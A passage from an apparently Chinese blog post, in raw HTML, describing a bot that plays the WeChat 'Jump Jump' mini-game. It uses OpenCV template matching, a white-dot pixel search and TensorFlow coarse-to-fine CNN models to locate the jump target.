class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">H *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">scale</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd3e290267293-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">r</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">W</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">float</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">resized</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">shape</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd3e290267293-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">resized</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">shape</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">h</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">resized</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">shape</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">w</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd3e290267293-10\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">break</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd3e290267293-11\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">res</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cv2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">matchTemplate</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">resized</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pivot</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cv2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">TM_CCOEFF_NORMED</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd3e290267293-12\"> </div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd3e290267293-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">loc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">np</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">where</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">res</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">res</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd3e290267293-14\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">pos_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pos_w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">list</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">zip</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">loc</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd3e290267293-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd3e290267293-16\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">found </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">None </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">res</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">found</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd3e290267293-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">found</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pos_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pos_w</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">res</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd3e290267293-18\"> </div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd3e290267293-19\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">found </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">None</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd3e290267293-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">pos_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pos_w</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">score</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">found</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd3e290267293-21\"><span class=\"crayon-e\">    </span><span class=\"crayon-v\">start_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">start_w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">pos_h *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e \">pos_w *</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd3e290267293-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">end_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">end_w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pos_h</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">h</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pos_w</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">w</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">r</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd3e290267293-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">start_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">start_w</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">end_h</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">end_w</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">score</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0073 seconds] -->\r\n<p>我们来试一试，效果还不错，应该说是又快又好，我所有的实验中找小人从来没有失误。</p>\n<p>不过这里的位置框的底部中心并不是小人的位置，真实的位置是在那之上一些。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fnig1jnfs0j20k00zkq33.jpg\" width=\"690\" height=\"1227\"></p>\n<p>同理，目标台面也可以用这种办法搜索，但是我们需要收集一些不同的台面，有圆形的，方形的，便利店，井盖，棱柱等等。由于数量一多，加上多尺度的原因，速度上会慢下来。这时候，我们就需要想办法加速了。首先可以注意到目标位置始终在小人的位置的上面，所以可以操作的一点就是在找到小人位置之后把小人位置以下的部分都舍弃掉，这样可以减少搜索空间。但是这还是不够，我们需要进一步去挖掘游戏里的故事。小人和目标台面基本上是关于屏幕中心对称的位置的。这提供了一个非常好的思路去缩小搜索空间。假设屏幕分辨率是（1280，720）的，小人底部的位置是（h1, w1),那么关于中心对称点的位置就是（1280 – h1， 720 – w1），以这个点为中心的一个边长300的正方形内，我们再去多尺度搜索目标位置，就会又快有准了。效果见下图，蓝色框是（300，300）的搜索区域，红色框是搜到的台面，矩形中心就是目标点的坐标了。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fnig1k9kyxj20k00zkq36.jpg\" width=\"690\" height=\"1227\"></p>\n<h2>加速的奇技淫巧（Fast-Search）</h2>\n<p>玩游戏需要细心观察。我们可以发现，小人上一次如果跳到台面中心，那么下一次目标台面的中心会有一个白点，就像刚才所展示的图里的。更加细心的人会发现，白点的RGB值是（245，245，245），这就让我找到了一个非常简单并且高效的方式，就是直接去搜索这个白点，注意到白点是一个连通区域，像素值为（245，245，245）的像素个数稳定在280-310之间，所以我们可以利用这个去直接找到目标的位置。这种方式只在前一次跳到中心的时候可以用，不过没有关系，我们每次都可以试一试这个不花时间的方法，不行再考虑多尺度搜索。</p>\n<p>讲到这里，我们的方法已经可以运行的非常出色了，基本上是一个永动机。下面是用我的手机玩了一个半小时左右，跳了859次的状态，我们的方法正确的计算出来了小人的位置和目标位置，不过我选择狗带了，因为手机卡的已经不行了。</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fnig1kwberj20k00bzt8u.jpg\" width=\"690\" height=\"413\"></p>\n<p>这里有一个示例视频，欢迎观看!</p>\n<p><a href=\"https://v.vzuu.com/video/932359600779309056\" target=\"_blank\">点击查看视频</a></p>\n<p><b>到这里就结束了吗？那我们和业余玩家有什么区别？下面进入正经的学术时间，非战斗人员请迅速撤离！</b></p>\n<h2>CNN Coarse-to-Fine 模型</h2>\n<p>考虑到IOS设备由于屏幕抓取方案的限制（WebDriverAgent获得的截图经过了压缩，图像像素受损，不再是原来的像素值，原因不详，欢迎了解详情的小伙伴提出改进意见~）无法使用fast-search，同时为了兼容多分辨率设备，我们使用卷积神经网络构建了一个更快更鲁棒的目标检测模型，下面分数据采集与预处理，coarse模型，fine模型，cascade四部分介绍我们的算法。</p>\n<h2>数据采集与预处理</h2>\n<p>基于我们非常准确的multiscale-search、fast-search模型，我们采集了7次实验数据，共计大约3000张屏幕截图，每一张截图均带有目标位置标注，对于每一张图，我们进行了两种不同的预处理方式，并分别用于训练coarse模型和fine模型，下面分别介绍两种不同的预处理方式。</p>\n<h2>Coarse 模型数据预处理</h2>\n<p>由于每一张图像中真正对于当前判断有意义的区域只在屏幕中央位置，即人和目标物体所在的位置，因此，每一张截图的上下两部分都是没有意义的，因此，我们将采集到的大小为1280*720的图像沿x方向上下各截去320*720大小，只保留中心640*720的图像作为训练数据。</p>\n<p>我们观察到，游戏中，每一次当小人落在目标物中心位置时，下一个目标物的中心会出现一个白色的圆点，</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/63918611gy1fnig1m4jdtj20k00zk74f.jpg\" width=\"690\" height=\"1227\"></p>\n<p>考虑到训练数据中fast-search会产生大量有白点的数据，为了杜绝白色圆点对网络训练的干扰，我们对每一张图进行了去白点操作，具体做法是，用白点周围的纯色像素填充白点区域。</p>\n<h2>Fine 模型数据预处理</h2>\n<p>为了进一步提升模型的精度，我们为fine模型建立了数据集，对训练集中的每一张图，在目标点附近截取320*320大小的一块作为训练数据，</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fnig1mrlqyj208w08wdfo.jpg\" width=\"320\" height=\"320\"></p>\n<p>为了防止网络学到trivial的结果，我们对每一张图增加了50像素的随机偏移。fine模型数据同样进行了去白点操作。</p>\n<h2>Coarse 模型</h2>\n<p>我们把这一问题看成了回归问题，coarse模型使用一个卷积神经网络回归目标的位置，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635abe0cd4d530132060\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef forward(self, img, is_training, keep_prob, name='coarse'):\r\n    with tf.name_scope(name):\r\n        with tf.variable_scope(name):\r\n            out = self.conv2d('conv1', img, [3, 3, self.input_channle, 16], 2)\r\n            # out = tf.layers.batch_normalization(out, name='bn1', training=is_training)\r\n            out = tf.nn.relu(out, name='relu1')\r\n\r\n            out = self.make_conv_bn_relu('conv2', out, [3, 3, 16, 32], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = self.make_conv_bn_relu('conv3', out, [5, 5, 32, 64], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = self.make_conv_bn_relu('conv4', out, [7, 7, 64, 128], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = self.make_conv_bn_relu('conv5', out, [9, 9, 128, 256], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = tf.reshape(out, [-1, 256 * 20 * 23])\r\n            out = self.make_fc('fc1', out, [256 * 20 * 23, 256], keep_prob)\r\n            out = self.make_fc('fc2', out, [256, 2], keep_prob)\r\n\r\n    return out</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd4d530132060-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd4d530132060-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd4d530132060-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd4d530132060-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd4d530132060-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd4d530132060-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd4d530132060-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd4d530132060-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd4d530132060-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd4d530132060-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd4d530132060-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd4d530132060-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd4d530132060-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd4d530132060-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd4d530132060-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd4d530132060-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd4d530132060-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd4d530132060-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd4d530132060-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd4d530132060-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd4d530132060-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd4d530132060-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a635abe0cd4d530132060-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635abe0cd4d530132060-24\">24</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635abe0cd4d530132060-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">forward</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">img</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keep_prob</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'coarse'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd4d530132060-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">with </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">name_scope</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd4d530132060-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">with </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">variable_scope</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd4d530132060-4\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">conv2d</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">img</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">input_channle</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd4d530132060-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-p\"># out = tf.layers.batch_normalization(out, name='bn1', training=is_training)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd4d530132060-6\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'relu1'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd4d530132060-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd4d530132060-8\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv2'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">32</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd4d530132060-9\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd4d530132060-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a635abe0cd4d530132060-11\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv3'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">32</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635abe0cd4d530132060-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> 